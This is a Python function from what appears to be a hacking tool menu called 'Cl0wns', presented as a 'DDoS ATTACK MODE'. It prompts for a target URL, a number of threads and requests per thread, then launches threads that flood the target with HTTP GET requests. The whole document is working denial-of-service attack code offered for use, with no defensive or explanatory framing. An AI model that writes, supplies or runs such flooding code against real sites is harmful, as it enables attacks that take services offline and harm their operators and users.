def ddos():
    clear()
    print("\n\033[1;31m[ğŸ”¥] Cl0wns â€“ DDoS ATTACK MODE [ğŸ”¥]\033[0m")

    while True:
        url = input("\033[1;33m[+] Target URL (http/https) or type 'back': ")
        if url.lower() == "back":
            return
        try:
            threads = int(input("[+] Number of Threads: "))
            requests_per_thread = int(input("[+] Requests per Thread: "))
        except:
            print("[!] Invalid input. Try again.")
            continue

        def attack():
            for _ in range(requests_per_thread):
                try:
                    requests.get(url)
                    print(f"\033[1;32m[+] Sent request to {url}")
                except:
                    print(f"\033[1;31m[-] Failed to send")

        print("\n\033[1;34m[âš™ï¸] Attacking...\033[0m\n")
        for _ in range(threads):
            thread = threading.Thread(target=attack)
            thread.start()

        print("\n[â†©ï¸] Type 'back' to return to main menu.\n")
        input()
        return

